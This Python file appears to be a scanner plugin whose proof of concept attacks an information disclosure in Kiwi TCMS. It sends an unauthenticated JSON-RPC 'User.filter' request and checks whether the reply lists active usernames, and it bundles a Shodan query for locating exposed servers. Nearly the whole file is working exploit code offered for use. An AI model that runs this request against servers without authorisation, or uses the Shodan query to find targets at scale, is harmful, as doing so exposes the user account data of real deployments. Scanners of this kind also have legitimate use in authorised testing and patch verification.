import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''Kiwi TCMS Information Disclosure''',
        "description": '''''',
        "severity": "high",
        "references": [
            "https://hackerone.com/reports/968402", 
            "https://kiwitcms.org/blog/kiwi-tcms-team/2020/08/23/kiwi-tcms-86/", 
            "https://github.com/act1on3/nuclei-templates/blob/master/vulnerabilities/kiwi-information-disclosure.yaml"
        ],
        "classification": {
            "cvss-metrics": "",
            "cvss-score": "",
            "cve-id": "",
            "cwe-id": ""
        },
        "metadata":{
            "vuln-target": "",
            "shodan-query":'''title:"Kiwi TCMS - Login",http.favicon.hash:-1909533337'''
        },
        "tags": ["kiwitcms", "exposure", "misconfig"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        path = """/json-rpc/"""
        method = "POST"
        data = {"jsonrpc":"2.0","method":"User.filter","id": 1,"params":{"query":{"is_active":True}}}
        headers = {'Content-Type': 'application/json', 'Accept-Encoding': 'gzip, deflate'}
        resp0 = requests.request(method=method,url=url+path,json=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if (resp0.status_code == 200) and ("""result""" in resp0.text and """username""" in resp0.text and """jsonrpc""" in resp0.text and """is_active""" in resp0.text):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url